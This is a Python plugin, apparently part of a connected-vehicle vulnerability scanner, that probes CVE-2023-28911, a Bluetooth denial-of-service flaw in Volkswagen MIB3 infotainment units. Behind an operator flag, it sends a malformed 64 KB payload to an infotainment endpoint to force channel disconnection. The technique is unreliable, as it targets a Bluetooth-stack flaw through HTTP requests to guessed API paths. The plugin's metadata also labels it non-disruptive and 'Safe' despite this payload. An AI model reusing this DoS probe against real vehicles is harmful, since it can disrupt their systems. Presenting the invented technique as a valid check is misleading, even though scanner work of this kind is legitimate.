#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 57,
    "cve": "CVE-2023-28911",
    "year": 2023,
    "domain": "IVI/云端/EVSE/OS",
    "vendor_product": "Volkswagen MIB3 Infotainment",
    "component": "MIB3 IVI",
    "type": "输入校验/DoS",
    "summary": "Skoda Superb III MIB3 IVI漏洞，影响多个OEM部件号。",
    "source_description": "A specific flaw exists within the Bluetooth stack of the MIB3 infotainment. The issue results from the lack of proper validation of user-supplied data, which can result in an arbitrary channel disconnection. An attacker can leverage this vulnerability to cause a denial-of-service attack for every connected client of the infotainment device.\nThe vulnerability was originally discovered in Skoda Superb III car with MIB3 infotainment unit OEM part number 3V0035820. The list of affected MIB3 OEM part numbers is provided in the referenced resources.",
    "poc_status": "公开公告；大多未见一步式PoC",
    "research_value": "作为近两年前后演进基线，对比2024-2026风险变化。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28911",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-28911",
        "https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf",
        "https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2",
        "https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/",
        "https://cveawg.mitre.org/api/cve/CVE-2023-28911"
    ],
    "affected": [
        {
            "vendor": "Preh Car Connect GmbH (JOYNEXT GmbH)",
            "product": "Volkswagen MIB3 infotainment system MIB3 OI MQB",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThanOrEqual": "0304",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-28911",
        "Volkswagen",
        "MIB3",
        "Infotainment",
        "IVI",
        "DoS",
        "specific",
        "flaw",
        "exists",
        "within",
        "Bluetooth",
        "stack",
        "infotainment",
        "issue",
        "results",
        "lack",
        "proper",
        "validation",
        "user-supplied",
        "data",
        "which",
        "result",
        "arbitrary",
        "channel",
        "disconnection",
        "leverage",
        "vulnerability",
        "cause",
        "denial-of-service",
        "attack"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2023-28911: VW MIB3 Bluetooth arbitrary channel disconnect DoS."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8080))
    tls = bool(params.get("tls", False))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or bool(params.get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2023-28911",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - VW MIB3 Bluetooth arbitrary channel disconnect DoS",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    r_root = probe.get("/")
    evidence["http_status"] = r_root.get("status")
    evidence["server_header"] = r_root.get("headers", {}).get("Server", "")

    if allow_disruptive:
        malformed_bt = b"\x04\x0E\xFF\xFF" + b"\x00" * 65532
        r_dos = probe.post("/api/bt/channel", malformed_bt, "application/octet-stream")
        evidence["bt_channel_dos_status"] = r_dos.get("status")
        if r_dos.get("status") in (500, None) or r_dos.get("error"):
            evidence["channel_disconnect_triggered"] = True
            return {
                "vulnerable": None,
                "evidence": evidence,
                "detection_confidence": detection_confidence("B", evidence, "bt_channel_dos_response"),
                "requires_manual_review": True,
            }

    for path in ["/api/bt", "/api/bluetooth", "/api/v1/bt/channels"]:
        r = probe.get(path)
        evidence[f"bt_{path.strip('/').replace('/', '_')}_status"] = r.get("status")
        if r.get("status") == 200:
            evidence["bt_service_accessible"] = path
            break

    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "mib3_bt_channel_probed"),
        "requires_manual_review": True,
    }

class Poc50CVE202328911DoSInputValidationAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-057'
    meta_poc_name = 'CVE-2023-28911 DoS Active Validation'
    meta_cve_id = 'CVE-2023-28911'
    meta_severity = 'Medium'
    meta_protocol = 'https'
    meta_target_os = ['linux']
    meta_required_params = ['tls_scan_text']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-28911'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-28911']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "50_VW_MIB3_Input_Validation_DoS_Audit") if "VULN" in dir() else "50_VW_MIB3_Input_Validation_DoS_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc50CVE202328911DoSInputValidationAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
